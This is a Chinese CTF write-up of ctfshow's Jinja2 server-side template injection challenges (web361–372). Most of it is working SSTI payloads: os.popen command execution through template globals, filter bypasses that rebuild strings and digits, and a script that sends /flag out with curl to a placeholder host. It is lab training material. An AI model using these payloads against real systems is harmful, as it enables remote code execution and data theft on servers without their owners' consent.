[TOC]

## ctfshow【SSTI】



![ssti](https://s2.loli.net/2023/04/24/rYUZ1ajV2o5BL43.png)

### web361

![image-20230424142934441](https://s2.loli.net/2023/04/24/1uZCF5s9Tp7qUJB.png)



首先get传参name，测试一下 `{'7'*7}`出现了7个7，代表这是python中的`jinja2模板`

这一题没有过滤什么东西，有很多种姿势，hackbar中自带了一些ssti的payload

![image-20230424143729232](https://s2.loli.net/2023/04/24/1aJIYiX2WlMN6P4.png)

```python
{{lipsum.__globals__['os'].popen('cat /flag').read()}}

{{lipsum.__globals__['__builtins__'].__getitem__("eval")("__import__('os').popen('cat /flag').read()")}}

{{config.__init__.__globals__['__builtins__'].__getitem__("eval")("__import__('os').popen('cat /flag').read()")}}

{{"".__class__.__bases__[0].__subclasses__()['catch_warnings'].__init__.__globals__['__builtins__'].__getitem__("eval")("__import__('os').popen('cat /flag').read()")}}

{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}

{{url_for.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}

{{x.__init__.__globals__['__builtins__'].__getitem__("eval")("__import__('os').popen('cat /flag').read()")}}
```

还有很多种姿势





### web362

把数字给过滤了，但是无所谓，上面的payload还是能用



### web363

把引号给过滤了，那么我们就不能使用上面的姿势了，我们需要找一种新的方式，

我们可以尝试使用get传参：`request.args.xxx`，

这样可以使用get传入一个变量名为xxx的参数



```python
{{lipsum.__globals__.__getitem__(request.args.a).popen(request.args.b).read()}}&a=os&b=cat /flag

{{a.__init__.__globals__[request.args.x].eval(request.args.y)}}&x=__builtins__&y=__import__("os").popen("cat /flag").read()

...
```





### web364

这一题把 `request.args`给过滤了，我们不能使用get传参，本来想用post传参的，但是不行，我们可以使用 `cookie传参`，`request.cookies.xxx`

![image-20230424150938083](https://s2.loli.net/2023/04/24/souZLwAVTdkhqnr.png)



### web365

这一题过滤了中括号 `[]`

我们可以不使用中括号取值的方式，

我们可以使用点 `.` 进行引用，或者使用 `__getitem__`取值



### web366

这一题把下划线`_`也给过滤掉了，意味着我们无法调用 带有下划线`_`的方法了，我们必须使用其他的方法，这里我们使用过滤器：过滤器是通过`管道符号|`进行使用的

这里我们需要了解：`attr()`过滤器，这个过滤器可以获得前者的属性

```
{{lipsum|attr(request.cookies.a)}}

cookie:
a=__globals__
```

<img src="https://s2.loli.net/2023/04/26/m1pIQsMCk8oKtrF.png" alt="image-20230426171925983" style="zoom: 33%;" />

这里我们通过过滤器，成功获得 `lipsum`的`__globals__`属性（使用cookie传参的方式）

![image-20230426172618435](https://s2.loli.net/2023/04/26/Z2S8srwEPQdiTIA.png)

```
{{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}

a=__globals__;b=cat /flag
```

注意使用os之前，要先用小括号括起来



### web367

这一题把`os`给ban了，使用cookie传参就行

```
{{(lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()}}

a=__globals__;b=__getitem__;c=os;d=cat /flag
```



### web368

这一题把 `{{}}`给过滤了，只能使用 `{% %}` 了，然后使用`print`将结果输出即可

```
{% print((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()) %}

a=__globals__;b=__getitem__;c=os;d=cat /flag
```

![image-20230426175246513](https://s2.loli.net/2023/04/26/biuW5fTvHk8ZmQG.png)



### web369

`request`都被过滤了，前面的payload全部用不了了，我们需要设置变量，然后一个个构造出来



```python
{% set po=dict(po=1,p=1)|join %}
{% set a=(()|select|string|list)|attr(po)(24) %}
{% set ini=(a,a,dict(ini=1,t=1)|join,a,a)|join %}
{% set gloa=(a,a,dict(glo=1,bals=1)|join,a,a)|join %}
{% set geti=(a,a,dict(geti=1,tem=1)|join,a,a)|join %}
{% set buil=(a,a,dict(buil=1,tins=1)|join,a,a)|join %}
{% set c=(xx|attr(ini)|attr(gloa)|attr(geti))(buil) %}
{% set chr=c.chr %}
{% set file=chr(99)%2Bchr(97)%2Bchr(116)%2Bchr(32)%2Bchr(47)%2Bchr(102)%2Bchr(108)%2Bchr(97)%2Bchr(103) %}  # cat /flag
{% print(c) %}
```

```python
构造po="pop"     #利用dict()|join拼接得到
{% set po=dict(po=a,p=a)|join%}

等效于a=(()|select|string|list).pop(24),即a等价于下划线_
{% set a=(()|select|string|list)|attr(po)(24)%}

构造ini="___init__"
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}

构造glo="__globals__"
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}

构造geti="__getitem__"
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}

构造built="__builtins__"
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}

调用chr()函数
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}

构造file='/flag'
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
```





### web370

这一题把数字也给过滤了,我们可以使用count过滤器，计算出字符串中的位数，得到数字

open函数和popen函数有区别，popen函数可以执行命令，open函数只是想指定文件读取内容，不能执行命令

```python
{% set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}  # 24
{% set f=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}  # f的ascii码
{% set l=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}
{% set aa=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}
{% set g=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}
{% set gang=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=x)|join|count %}
{% set xx=(()|select|string|list) %}
{% set po=dict(po=a,p=a)|join %}
{% set x=xx.pop(num) %}
{% set ini=x~x~(dict(ini=a,t=a)|join)~x~x %}
{% set glob=x~x~(dict(glo=a,bals=a)|join)~x~x %}
{% set geti=x~x~(dict(geti=a,tem=a)|join)~x~x %}
{% set buil=x~x~(dict(buil=a,tins=a)|join)~x~x %}
{% set c=((lipsum|attr(glob)|attr(geti))(buil)) %}
{% set chr=c.chr %}
{% set file=chr(gang)%2Bchr(f)%2Bchr(l)%2Bchr(aa)%2Bchr(g) %}
{% print(c.open(file).read())%}
```





### web371

这一题把`print`给过滤掉了，没办法回显，只能考虑使用`curl命令外带`了，我们可以将数据外带到dns平台上面

这里生成了 `0~9` 的数字，然后巧妙的使用 ~ 进行字符串拼接，然后使用 `int 过滤器`转化为整数

```python
{% set c=(t|count)%}  # 0
{% set cc=(dict(e=a)|join|count)%}
{% set ccc=(dict(ee=a)|join|count)%}
{% set cccc=(dict(eee=a)|join|count)%}
{% set ccccc=(dict(eeee=a)|join|count)%}
{% set cccccc=(dict(eeeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}  # 10
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}  # 使用eval函数，执行curl命令进行外带
abc
{%endif%}
```

cmd的参数我们使用脚本生成：

```python
def aaa(t):
	t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'
	return t
s='__import__("os").popen("curl http://you_ip?p=`cat /flag`").read()'
def ccchr(s):
	t=''
	for i in range(len(s)):
		if i<len(s)-1:
			t+='chr('+aaa(str(ord(s[i])))+')%2b'
		else:
			t+='chr('+aaa(str(ord(s[i])))+')'
	return t
print(ccchr(s))
```





### web372

这一题过滤了 `count` 可以使用 `length`过滤器，将上题的 `count`替换为`length`即可



```python
{% set c=(t|length)%}
{% set cc=(dict(e=a)|join|length)%}
{% set ccc=(dict(ee=a)|join|length)%}
{% set cccc=(dict(eee=a)|join|length)%}
{% set ccccc=(dict(eeee=a)|join|length)%}
{% set cccccc=(dict(eeeee=a)|join|length)%}
{% set ccccccc=(dict(eeeeee=a)|join|length)%}
{% set cccccccc=(dict(eeeeeee=a)|join|length)%}
{% set ccccccccc=(dict(eeeeeeee=a)|join|length)%}
{% set cccccccccc=(dict(eeeeeeeee=a)|join|length)%}
{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|length)%}
{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|length)%}
{% set coun=(ccc~ccccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=
%}
{%if x.eval(cmd)%}
abc
{%endif%}
```







